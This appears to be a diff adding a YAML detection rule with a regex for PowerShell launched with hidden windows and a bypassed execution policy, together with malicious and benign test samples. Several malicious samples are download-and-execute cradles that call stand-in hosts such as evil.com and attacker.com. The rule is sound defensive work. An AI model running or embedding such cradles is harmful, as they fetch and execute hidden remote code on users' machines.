@@ -1,0 +1,43 @@
+name: high-06-powershell-flags
+severity: high
+description: >
+  Detects PowerShell with suspicious flag combinations like hidden windows and bypassed execution policy.
+
+pattern: |
+  (?i)powershell.*-(w|windowstyle)\s+(hidden|h)|powershell.*(-(w|windowstyle)\s+(hidden|h)).*(-(ep|executionpolicy)\s+(bypass|unrestricted))|(-(ep|executionpolicy)\s+(bypass|unrestricted)).*(-(w|windowstyle)\s+(hidden|h))
+
+malicious:
+  - 'powershell -w hidden -c "malicious code"'
+  - 'powershell.exe -WindowStyle Hidden -Command "IWR http://evil.com/p.ps1 | IEX"'
+  - "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File malicious.ps1"
+  - 'powershell -ep bypass -w hidden -c "evil command"'
+  - 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "backdoor"'
+  - 'powershell -w h -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://evil.com/p.ps1'')"'
+  - "POWERSHELL -WINDOWSTYLE HIDDEN -EXECUTIONPOLICY BYPASS malware.ps1"
+  - "powershell -ep unrestricted -w hidden malicious.ps1"
+  - "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden script.ps1"
+  - 'powershell -nop -w h -ep bypass -c "evil"'
+  - 'powershell.exe -WindowStyle h -ExecutionPolicy bypass -Command "malware"'
+  - 'powershell -w hidden -nop -ep bypass -c "(New-Object Net.WebClient).DownloadString(''http://evil.com/s.ps1'')|IEX"'
+  - 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command "backdoor"'
+  - "powershell -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass clickfix.ps1"
+  - 'powershell.exe -NoProfile -w hidden -ep bypass -c "curl http://evil.com/p.ps1 | iex"'
+  - 'cmd /c powershell -w hidden -nop -ep bypass -c "malicious"'
+  - 'powershell -WindowStyle Hidden -NoProfile -ep bypass -c "IWR http://attacker.com/payload.ps1|IEX"'
+
+benign:
+  - 'powershell -Command "Get-Process"'
+  - "powershell.exe Get-Service"
+  - "powershell -File script.ps1"
+  - 'powershell -Version 5.1 -Command "Get-Date"'
+  - 'powershell.exe -Command "Write-Host ''Hello''"'
+  - "powershell Get-EventLog -LogName Application"
+  - "powershell -Command Test-Path C:\\Temp"
+  - "powershell.exe -File C:\\Scripts\\maintenance.ps1"
+  - 'powershell -NoLogo -Command "Get-ChildItem"'
+  - "powershell -ExecutionPolicy Bypass C:\\IT\\Scripts\\approved-script.ps1"
+  - 'powershell.exe -Command "Get-Process | Where-Object CPU -gt 100"'
+  - "powershell -File C:\\Admin\\backup.ps1"
+  - 'powershell -Command "Write-Output ''Test''"'
+  - "powershell.exe -NoProfile C:\\Scripts\\maintenance.ps1"
+  - "pwsh -Command Get-Date"
